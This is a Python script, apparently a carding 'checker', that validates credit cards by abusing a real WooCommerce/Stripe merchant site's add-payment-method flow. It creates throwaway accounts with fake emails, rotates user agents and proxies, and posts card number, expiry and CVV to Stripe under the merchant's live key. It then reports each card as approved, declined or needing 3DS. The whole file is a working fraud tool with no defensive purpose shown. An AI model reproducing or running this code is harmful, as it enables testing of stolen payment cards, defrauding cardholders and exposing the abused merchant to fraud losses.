# ============================================================
#  SA1 — Stripe Auth CCN (ljandrews.net WCPay setup intent)
#  1:1 port from meduza_patched flow1
# ============================================================

import requests
import random
import string
import secrets
import uuid
import time
import hashlib
from datetime import datetime
from typing import Optional
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from faker import Faker
except ImportError:
    Faker = None

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None

def gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""

_EMAILS = [
    'gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com',
    'proton.me','protonmail.com','live.com','msn.com','yahoo.co.id',
    'yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk',
    'live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com',
    'tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com',
    'pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de',
    'web.de','seznam.cz','laposte.net','orange.fr','byom.de','byom.my.id',
    'edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc',
    'momoi.re','mailgun.co','inboxkitten.com','maildrop.cc',
]


def _flow1(card, proxy_dict=None):
    ses = requests.Session()
    if proxy_dict:
        ses.proxies.update(proxy_dict)
    ses.verify = False

    fake = Faker("en_US") if Faker else None
    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36'

    email = f"{fake.user_name().lower() if fake else ''.join(random.choices(string.ascii_lowercase, k=8))}_{secrets.token_hex(4)}@{random.choice(_EMAILS)}"
    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    cc, mm, yy, cvv = card.split("|")
    mm = mm.zfill(2)
    yy = yy[-2:].zfill(2)
    cvv = cvv[:4]

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'user-agent': useragents,
    }

    r = ses.get('https://ljandrews.net/my-account/', headers=headers, timeout=35)
    txt = r.text.strip()
    regnonce = gstr(txt, 'name="woocommerce-register-nonce" value="', '"')
    if not regnonce:
        return None

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://ljandrews.net',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://ljandrews.net/my-account/',
        'user-agent': useragents,
    }

    data = {
        'email': email,
        'wc_order_attribution_source_type': 'organic',
        'wc_order_attribution_referrer': 'https://www.google.com/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': 'google',
        'wc_order_attribution_utm_medium': 'organic',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://ljandrews.net/my-account',
        'wc_order_attribution_session_start_time': today1,
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': useragents,
        'woocommerce-register-nonce': regnonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    ses.post('https://ljandrews.net/my-account/', headers=headers, data=data, timeout=35)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://ljandrews.net/my-account/',
        'user-agent': useragents,
    }

    ses.get('https://ljandrews.net/my-account/payment-methods/', headers=headers, timeout=35)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://ljandrews.net/my-account/payment-methods/',
        'user-agent': useragents,
    }

    r = ses.get('https://ljandrews.net/my-account/add-payment-method/', headers=headers, timeout=35)
    txt = r.text.strip()
    setupNonce = gstr(txt, '"createSetupIntentNonce":"', '"')

    if not setupNonce:
        return None

    headers = {
        'accept': 'application/json',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'user-agent': useragents,
    }

    ses.get(
        f'https://api.stripe.com/v1/elements/sessions?client_betas[0]=card_country_event_beta_1&deferred_intent[mode]=setup&deferred_intent[currency]=usd&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=usd&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1LPtta2Hx9wpKDcI&elements_init_source=stripe.elements&referrer_host=ljandrews.net&stripe_js_id={sessionuid}&locale=en&type=deferred_intent',
        headers=headers, timeout=35,
    )

    headers = {
        'accept': 'application/json',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': useragents,
    }

    pm_data = {
        "billing_details[name]": "",
        "billing_details[email]": email,
        "billing_details[address][country]": "ID",
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/5e596c82e6; stripe-js-v3/5e596c82e6; payment-element; deferred-intent",
        "referrer": "https://ljandrews.net",
        "time_on_page": "36898",
        "client_attribution_metadata[client_session_id]": "3833fd28-9c7c-45a2-9b22-6639205da29a",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_id]": "elements_session_1HuMk1Rs6QF",
        "client_attribution_metadata[elements_session_config_id]": "164571f3-61a6-431a-bd3f-40cbacab3864",
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "key": "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs",
        "_stripe_account": "acct_1LPtta2Hx9wpKDcI",
    }

    r = ses.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=pm_data, timeout=35)
    txt = r.text.strip()
    idpm = gstr(txt, 'id": "', '"')
    if not idpm:
        message1 = gstr(txt, 'message": "', '"')
        return False, message1 or "Payment method failed"

    headers = {
        'accept': '*/*',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'origin': 'https://ljandrews.net',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://ljandrews.net/my-account/add-payment-method/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': useragents,
    }

    payload = {
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, idpm),
        '_ajax_nonce': (None, setupNonce),
    }

    r = ses.post('https://ljandrews.net/wp-admin/admin-ajax.php', headers=headers, files=payload, timeout=35)
    res = r.json()

    if res.get("success") is True and res.get("data", {}).get("status") == "succeeded":
        return True, "Card Approved"
    elif res.get("success") is True and res.get("data", {}).get("status") == "requires_action":
        return False, "3DS Required"
    elif res.get("success") is False:
        message = gstr(r.text, '"message":"', '"') or "Declined"
        return False, message

    return None


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"

        card = cc_line.strip()

        for attempt in range(5):
            try:
                result = _flow1(card, proxy_dict)
                elapsed = f"{time.time() - start:.1f}s"

                if result is None:
                    if attempt < 4:
                        time.sleep(random.uniform(2, 5))
                        continue
                    return f"Error | Max retries | {elapsed}"

                if isinstance(result, tuple):
                    success, detail = result
                    if success is True:
                        return f"Approved | {detail} | {elapsed}"
                    elif success is False:
                        return f"Declined | {detail} | {elapsed}"

                return f"Error | Unknown | {elapsed}"

            except (requests.exceptions.ProxyError, requests.exceptions.SSLError,
                    requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                    ConnectionError, OSError):
                if attempt < 4:
                    time.sleep(random.uniform(0.3, 1.0))
                    continue
                return f"Declined | Gateway Timeout | {time.time() - start:.1f}s"
            except Exception as e:
                return f"Error | {str(e)[:60]} | {time.time() - start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    try:
        r = requests.get('https://ljandrews.net/my-account/', timeout=15, verify=False)
        if 'woocommerce-register-nonce' in r.text:
            return True, "WCPay registration active"
        return False, "Registration form not found"
    except Exception as e:
        return False, str(e)[:60]
